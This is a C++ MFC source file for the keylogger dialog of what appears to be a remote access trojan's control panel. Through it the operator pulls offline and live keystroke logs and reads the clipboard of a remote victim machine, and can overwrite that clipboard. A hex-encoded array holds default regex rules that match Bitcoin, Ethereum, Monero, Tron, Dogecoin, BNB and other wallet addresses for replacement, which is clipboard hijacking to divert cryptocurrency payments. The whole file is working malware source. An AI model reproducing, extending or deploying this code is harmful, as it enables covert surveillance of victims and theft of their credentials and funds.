// CKeyBoardDlg 对话框
#include "stdafx.h"
#include "Quick.h"
#include "KeyBoardDlg.h"
#include "InputDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
unsigned char hexData[718] = {
	0xCB, 0xB5, 0xC3, 0xF7, 0x42, 0x54, 0x43, 0xB1,
	0xED, 0xB4, 0xEF, 0xCA, 0xBD, 0x28, 0x5E, 0x28,
	0x62, 0x63, 0x31, 0x7C, 0x5B, 0x31, 0x33, 0x5D,
	0x29, 0x5B, 0x61, 0x2D, 0x7A, 0x41, 0x2D, 0x48,
	0x4A, 0x2D, 0x4E, 0x50, 0x2D, 0x5A, 0x30, 0x2D,
	0x39, 0x5D, 0x7B, 0x32, 0x35, 0x2C, 0x33, 0x39,
	0x7D, 0x24, 0x29, 0xCC, 0xE6, 0xBB, 0xBB, 0x42,
	0x54, 0x43, 0xB1, 0xD2, 0x0D, 0x0A, 0xCB, 0xB5,
	0xC3, 0xF7, 0x65, 0x74, 0x68, 0xB1, 0xED, 0xB4,
	0xEF, 0xCA, 0xBD, 0x28, 0x30, 0x78, 0x5B, 0x61,
	0x2D, 0x66, 0x41, 0x2D, 0x46, 0x30, 0x2D, 0x39,
	0x5D, 0x7B, 0x34, 0x30, 0x2C, 0x34, 0x32, 0x7D,
	0x24, 0x29, 0xCC, 0xE6, 0xBB, 0xBB, 0x65, 0x74,
	0x68, 0xB1, 0xD2, 0x0D, 0x0A, 0xCB, 0xB5, 0xC3,
	0xF7, 0x78, 0x6D, 0x72, 0xB1, 0xED, 0xB4, 0xEF,
	0xCA, 0xBD, 0x28, 0x34, 0x5B, 0x30, 0x2D, 0x39,
	0x41, 0x42, 0x5D, 0x5B, 0x31, 0x2D, 0x39, 0x41,
	0x2D, 0x48, 0x4A, 0x2D, 0x4E, 0x50, 0x2D, 0x5A,
	0x61, 0x2D, 0x6B, 0x6D, 0x2D, 0x7A, 0x5D, 0x7B,
	0x39, 0x33, 0x7D, 0x24, 0x29, 0xCC, 0xE6, 0xBB,
	0xBB, 0x78, 0x6D, 0x72, 0xB1, 0xD2, 0x0D, 0x0A,
	0xCB, 0xB5, 0xC3, 0xF7, 0x78, 0x6C, 0x6D, 0xB1,
	0xED, 0xB4, 0xEF, 0xCA, 0xBD, 0x28, 0x47, 0x5B,
	0x30, 0x2D, 0x39, 0x61, 0x2D, 0x7A, 0x41, 0x2D,
	0x5A, 0x5D, 0x7B, 0x35, 0x35, 0x7D, 0x24, 0x29,
	0xCC, 0xE6, 0xBB, 0xBB, 0x78, 0x6C, 0x6D, 0xB1,
	0xD2, 0x0D, 0x0A, 0xCB, 0xB5, 0xC3, 0xF7, 0x78,
	0x72, 0x70, 0xB1, 0xED, 0xB4, 0xEF, 0xCA, 0xBD,
	0x28, 0x72, 0x5B, 0x30, 0x2D, 0x39, 0x61, 0x2D,
	0x7A, 0x41, 0x2D, 0x5A, 0x5D, 0x7B, 0x32, 0x34,
	0x2C, 0x33, 0x34, 0x7D, 0x24, 0x29, 0xCC, 0xE6,
	0xBB, 0xBB, 0x78, 0x72, 0x70, 0xB1, 0xD2, 0x0D,
	0x0A, 0xCB, 0xB5, 0xC3, 0xF7, 0x69, 0x74, 0x63,
	0xB1, 0xED, 0xB4, 0xEF, 0xCA, 0xBD, 0x28, 0x5B,
	0x4C, 0x4D, 0x33, 0x5D, 0x5B, 0x61, 0x2D, 0x6B,
	0x6D, 0x2D, 0x7A, 0x41, 0x2D, 0x48, 0x4A, 0x2D,
	0x4E, 0x50, 0x2D, 0x5A, 0x31, 0x2D, 0x39, 0x5D,
	0x7B, 0x32, 0x36, 0x2C, 0x33, 0x33, 0x7D, 0x24,
	0x29, 0xCC, 0xE6, 0xBB, 0xBB, 0x69, 0x74, 0x63,
	0xB1, 0xD2, 0x0D, 0x0A, 0xCB, 0xB5, 0xC3, 0xF7,
	0x4E, 0x45, 0x43, 0xB1, 0xED, 0xB4, 0xEF, 0xCA,
	0xBD, 0x28, 0x41, 0x5B, 0x30, 0x2D, 0x39, 0x61,
	0x2D, 0x7A, 0x41, 0x2D, 0x5A, 0x5D, 0x7B, 0x33,
	0x33, 0x7D, 0x24, 0x29, 0xCC, 0xE6, 0xBB, 0xBB,
	0x4E, 0x45, 0x43, 0xB1, 0xD2, 0x0D, 0x0A, 0xCB,
	0xB5, 0xC3, 0xF7, 0x62, 0x63, 0x68, 0xB1, 0xED,
	0xB4, 0xEF, 0xCA, 0xBD, 0x28, 0x28, 0x62, 0x69,
	0x74, 0x63, 0x6F, 0x69, 0x6E, 0x63, 0x61, 0x73,
	0x68, 0x3A, 0x29, 0x3F, 0x28, 0x71, 0x7C, 0x70,
	0x29, 0x5B, 0x61, 0x2D, 0x7A, 0x30, 0x2D, 0x39,
	0x5D, 0x7B, 0x34, 0x31, 0x7D, 0x29, 0xCC, 0xE6,
	0xBB, 0xBB, 0x62, 0x63, 0x68, 0xB1, 0xD2, 0x0D,
	0x0A, 0xCB, 0xB5, 0xC3, 0xF7, 0x64, 0x61, 0x73,
	0x68, 0xB1, 0xED, 0xB4, 0xEF, 0xCA, 0xBD, 0x28,
	0x58, 0x5B, 0x31, 0x2D, 0x39, 0x41, 0x2D, 0x48,
	0x4A, 0x2D, 0x4E, 0x50, 0x2D, 0x5A, 0x61, 0x2D,
	0x6B, 0x6D, 0x2D, 0x7A, 0x5D, 0x7B, 0x33, 0x33,
	0x7D, 0x24, 0x29, 0xCC, 0xE6, 0xBB, 0xBB, 0x64,
	0x61, 0x73, 0x68, 0xB1, 0xD2, 0x0D, 0x0A, 0xCB,
	0xB5, 0xC3, 0xF7, 0x74, 0x72, 0x63, 0x32, 0x30,
	0xB1, 0xED, 0xB4, 0xEF, 0xCA, 0xBD, 0x28, 0x54,
	0x5B, 0x41, 0x2D, 0x5A, 0x61, 0x2D, 0x7A, 0x31,
	0x2D, 0x39, 0x5D, 0x7B, 0x33, 0x33, 0x7D, 0x29,
	0xCC, 0xE6, 0xBB, 0xBB, 0x74, 0x72, 0x63, 0x32,
	0x30, 0xB1, 0xD2, 0x0D, 0x0A, 0xCB, 0xB5, 0xC3,
	0xF7, 0x41, 0x44, 0x41, 0xB1, 0xED, 0xB4, 0xEF,
	0xCA, 0xBD, 0x28, 0x61, 0x64, 0x64, 0x72, 0x5B,
	0x30, 0x2D, 0x39, 0x2D, 0x61, 0x2D, 0x7A, 0x5D,
	0x7B, 0x39, 0x39, 0x7D, 0x29, 0xCC, 0xE6, 0xBB,
	0xBB, 0x41, 0x44, 0x41, 0xB1, 0xD2, 0x0D, 0x0A,
	0xCB, 0xB5, 0xC3, 0xF7, 0x64, 0x6F, 0x67, 0x65,
	0xB1, 0xED, 0xB4, 0xEF, 0xCA, 0xBD, 0x28, 0x44,
	0x7B, 0x31, 0x7D, 0x5B, 0x35, 0x2D, 0x39, 0x41,
	0x2D, 0x48, 0x4A, 0x2D, 0x4E, 0x50, 0x2D, 0x55,
	0x5D, 0x7B, 0x31, 0x7D, 0x5B, 0x31, 0x2D, 0x39,
	0x41, 0x2D, 0x48, 0x4A, 0x2D, 0x4E, 0x50, 0x2D,
	0x5A, 0x61, 0x2D, 0x6B, 0x6D, 0x2D, 0x7A, 0x5D,
	0x7B, 0x33, 0x32, 0x7D, 0x24, 0x29, 0xCC, 0xE6,
	0xBB, 0xBB, 0x64, 0x6F, 0x67, 0x65, 0xB1, 0xD2,
	0x0D, 0x0A, 0xCB, 0xB5, 0xC3, 0xF7, 0x5A, 0x63,
	0x61, 0x73, 0x68, 0xB1, 0xED, 0xB4, 0xEF, 0xCA,
	0xBD, 0x28, 0x74, 0x31, 0x5B, 0x30, 0x2D, 0x39,
	0x41, 0x2D, 0x7A, 0x5D, 0x7B, 0x33, 0x33, 0x7D,
	0x29, 0xCC, 0xE6, 0xBB, 0xBB, 0x5A, 0x63, 0x61,
	0x73, 0x68, 0xB1, 0xD2, 0x0D, 0x0A, 0xCB, 0xB5,
	0xC3, 0xF7, 0x62, 0x6E, 0x62, 0xB1, 0xED, 0xB4,
	0xEF, 0xCA, 0xBD, 0x28, 0x62, 0x6E, 0x62, 0x5B,
	0x30, 0x2D, 0x39, 0x2D, 0x61, 0x2D, 0x7A, 0x5D,
	0x7B, 0x33, 0x39, 0x7D, 0x29, 0xCC, 0xE6, 0xBB,
	0xBB, 0x62, 0x6E, 0x62, 0xB1, 0xD2
};

//IMPLEMENT_DYNAMIC(CKeyBoardDlg, CXTPResizeDialog)

CKeyBoardDlg::CKeyBoardDlg(CWnd* pParent, ISocketBase* IOCPServer, ClientContext* ContextObject)
	: CXTPResizeDialog(CKeyBoardDlg::IDD, pParent)
	, CSClipboard(_T(""))
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_DEC));
	m_iocpServer = IOCPServer;
	m_pContext = ContextObject;
	m_bOnClose = false;
}



void CKeyBoardDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_OFFIINE, m_edit_offline);
	DDX_Control(pDX, IDC_EDIT_ONLINE, m_edit_online);
	DDX_Control(pDX, IDC_EDIT_ONLINE2, m_edit_clipboard);
	DDX_Text(pDX, IDC_EDIT_CLIPBOARD, CSClipboard);
}

BEGIN_MESSAGE_MAP(CKeyBoardDlg, CXTPResizeDialog)
	ON_BN_CLICKED(IDC_BUTTON_GET, &CKeyBoardDlg::OnBnClickedButtonGet)
	ON_BN_CLICKED(IDC_BUTTON_DEL, &CKeyBoardDlg::OnBnClickedButtonDel)
	ON_BN_CLICKED(IDC_BUTTON_BACKUP, &CKeyBoardDlg::OnBnClickedButtonBackup)
	ON_BN_CLICKED(IDC_BUTTON_OPEN, &CKeyBoardDlg::OnBnClickedButtonOpen)
	ON_BN_CLICKED(IDC_BUTTON_SET_CLIPBOARD, &CKeyBoardDlg::OnBnClickedButtonSetClipboard)
	ON_BN_CLICKED(IDC_BUTTON_CLOSE, &CKeyBoardDlg::OnBnClickedButtonClose)
	ON_BN_CLICKED(IDC_BUTTON_SAVE_REGEX, &CKeyBoardDlg::OnBnClickedButtonSaveRegex)
	ON_BN_CLICKED(IDC_BUTTON_GET_REGEX, &CKeyBoardDlg::OnBnClickedButtonGetRegex)
	ON_BN_CLICKED(IDC_BUTTON_DEL_REGEX, &CKeyBoardDlg::OnBnClickedButtonDelRegex)
	ON_BN_CLICKED(IDC_BUTTON_SET_REGEX, &CKeyBoardDlg::OnBnClickedButtonSetRegex)
END_MESSAGE_MAP()

// CKeyBoardDlg 消息处理程序

BOOL CKeyBoardDlg::OnInitDialog()
{
	CXTPResizeDialog::OnInitDialog();
	SetIcon(m_hIcon, FALSE);
	CString strString;
	strString.Format(_T("键盘记录 \\\\ %s"), m_pContext->szAddress);
	SetWindowText(strString);
	m_edit_offline.SetWindowText(_T("离线记录"));
	m_edit_online.SetWindowText(_T("实时获取按键"));
	m_edit_clipboard.SetWindowText(_T("获取剪切板"));
	CStip = _T("");

	SetResize(IDC_EDIT_OFFIINE, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_BOTTOMLEFT);

	SetResize(IDC_BUTTON_CLOSE, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_GET, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_DEL, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_BACKUP, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_OPEN, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_SET_CLIPBOARD, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);

	SetResize(IDC_BUTTON_GET_REGEX, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_SAVE_REGEX, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_DEL_REGEX, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
	SetResize(IDC_BUTTON_SET_REGEX, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);


	SetResize(IDC_EDIT_ONLINE, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_BOTTOMRIGHT);
	SetResize(IDC_EDIT_ONLINE2, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMRIGHT);
	SetResize(IDC_EDIT_CLIPBOARD, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMRIGHT);


	BYTE bToken = COMMAND_KEYBOARD_GETOFFLINE;
	m_iocpServer->Send(m_pContext, &bToken, 1);

	return TRUE;

}

void CKeyBoardDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("键盘记录 \\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]  %s"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024), CStip.GetBuffer());
	SetWindowText(str);
}


void CKeyBoardDlg::OnReceiveComplete(void)
{
	if (m_bOnClose) 	return;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_KEYBOARD_OFFLINEDATA:
	{
		m_edit_offline.SetWindowText(_T(""));
		CString strResult = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
		m_edit_offline.SetWindowText(strResult);
	}
	break;
	case TOKEN_KEYBOARD_OFFLINEDATA_ERROR:
	{
		if (m_pContext->m_DeCompressionBuffer.GetBufferLen()==1)
		{
			CStip = _T("打开历史记录失败！ 可能未开启记录");
		}
		else
		{
			CStip = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
		}
		OnReceive();
	}
	break;
	case TOKEN_KEYBOARD_ONLINEDATA:
	{

		CString strResult = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
		int	len = m_edit_online.GetWindowTextLength();
		m_edit_online.SetSel(len, len);
		m_edit_online.ReplaceSel(strResult);
	}
	break;
	case TOKEN_KEYBOARD_CLIPBOARD:
	{
		CString strResult;
		strResult += _T("\r\n");
		strResult += (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
		int	len = m_edit_clipboard.GetWindowTextLength();
		m_edit_clipboard.SetSel(len, len);
		m_edit_clipboard.ReplaceSel(strResult);
	}

	default:
		break;
	}
}

void CKeyBoardDlg::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}


void CKeyBoardDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CXTPResizeDialog::PostNcDestroy();
	delete this;
}




void CKeyBoardDlg::OnBnClickedButtonGet()
{
	BYTE bToken = COMMAND_KEYBOARD_GETOFFLINE;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKeyBoardDlg::OnBnClickedButtonDel()
{
	m_edit_offline.SetWindowText(_T(""));
	BYTE bToken = COMMAND_KEYBOARD_DEL;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKeyBoardDlg::OnBnClickedButtonBackup()
{
	CString	strFileName = m_pContext->szAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.txt"));
	CFileDialog dlg(FALSE, _T("txt"), strFileName, OFN_OVERWRITEPROMPT, _T("(*.txt)|*.txt|"), this);
	if (dlg.DoModal() != IDOK)
		return;

	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		CStip = _T("提示信息：记录文件保存失败！");
		OnReceive();
		return;
	}
	// Write the DIB header and the bits
	CString	strRecord;
	m_edit_offline.GetWindowText(strRecord);
	CStringA strRecordA;
	strRecordA = strRecord;
	file.Write(strRecordA, strRecordA.GetLength());
	file.Close();
	CStip = _T("提示信息：记录文件保存成功！");
	OnReceive();
	return;
}


void CKeyBoardDlg::OnBnClickedButtonOpen()
{
	BYTE bToken = COMMAND_KEYBOARD_OLKEYLOG_START;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKeyBoardDlg::OnBnClickedButtonSetClipboard()
{
	SendLocalClipboard();
}


void CKeyBoardDlg::OnBnClickedButtonClose()
{
	BYTE bToken = COMMAND_KEYBOARD_OLKEYLOG_CLOSE;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKeyBoardDlg::SendLocalClipboard()
{
	UpdateData(TRUE);
	CStringA CSClipboarda;
	CSClipboarda = CSClipboard;
	int len = CSClipboarda.GetLength();
	LPBYTE	lpData = new BYTE[len+2];
	lpData[0] = COMMAND_KEYBOARD_SET_CLIPBOARD_DIF;
	memcpy(lpData + 1, CSClipboarda.GetBuffer(), len + 1);
	m_iocpServer->Send(m_pContext, lpData, len + 2);
	SAFE_DELETE_AR(lpData);

}


void CKeyBoardDlg::OnBnClickedButtonSaveRegex()
{
	if (MessageBox(_T("确认保存编辑框的配置吗？"), _T("防止误按"), MB_OKCANCEL) == IDOK)
	{
		UpdateData(TRUE);
		HKEY hKey;
		::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_SET_VALUE, &hKey);
		::RegDeleteValue(hKey, _T("IpDateRegex"));
		::RegCloseKey(hKey);

		DWORD localsize = CSClipboard.GetLength() * 2 + 2;

		if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), &hKey))
		{
			if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpDateRegex"), 0, REG_BINARY, (unsigned char*)CSClipboard.GetBuffer(), localsize))
			{
				::RegCloseKey(hKey);
				return;
			}
		}
		::RegCloseKey(hKey);
	}
}


void CKeyBoardDlg::OnBnClickedButtonGetRegex()
{
	HKEY hKEY;
	DWORD dwType = REG_BINARY;
	DWORD dwTypesize = REG_DWORD;
	DWORD dw = sizeof(DWORD);
	DWORD dataSize = 0;

	if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_READ, &hKEY))
	{
		RegQueryValueEx(hKEY, _T("IpDateRegex"), NULL, &dwType, NULL, &dataSize);
		if (dataSize < 3)
		{
			if (MessageBox(_T("没有记录或者获取失败，手动填写吧 规则"), _T("防止误按"), MB_OKCANCEL) == IDOK)
			{
				CStringA tem = (char*)hexData;
				CSClipboard = tem;
				UpdateData(FALSE);
			}
			return;
		}
		char* rdata = new  char[dataSize];
		ZeroMemory(rdata, dataSize);
		if (::RegQueryValueEx(hKEY, _T("IpDateRegex"), 0, &dwType, (LPBYTE)rdata, &dataSize) != ERROR_SUCCESS)
		{
			if (MessageBox(_T("没有记录或者获取失败，手动填写吧 规则"), _T("防止误按"), MB_OKCANCEL) == IDOK)
			{
				CStringA tem = (char*)hexData;
				CSClipboard = tem;
			}
		}
		else
		{
			CSClipboard = (TCHAR*)rdata;
		}
		SAFE_DELETE_AR(rdata);
		UpdateData(FALSE);
	}
}


void CKeyBoardDlg::OnBnClickedButtonDelRegex()
{
	BYTE bToken = COMMAND_KEYBOARD_REGEX_DELRULE;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKeyBoardDlg::OnBnClickedButtonSetRegex()
{
	UpdateData(TRUE);
	CStringA CSClipboarda;
	CSClipboarda = CSClipboard;
	if (CSClipboarda.GetBuffer()[CSClipboarda.GetAllocLength()] != '\n')
	{
		CSClipboarda += "\r\n";
	}
	int len = CSClipboarda.GetLength();
	LPBYTE	lpData = new BYTE[len + 2];
	lpData[0] = COMMAND_KEYBOARD_REGEX_SETRULE;
	memcpy(lpData + 1, CSClipboarda.GetBuffer(), len + 1);
	m_iocpServer->Send(m_pContext, lpData, len + 2);
	SAFE_DELETE_AR(lpData);
}
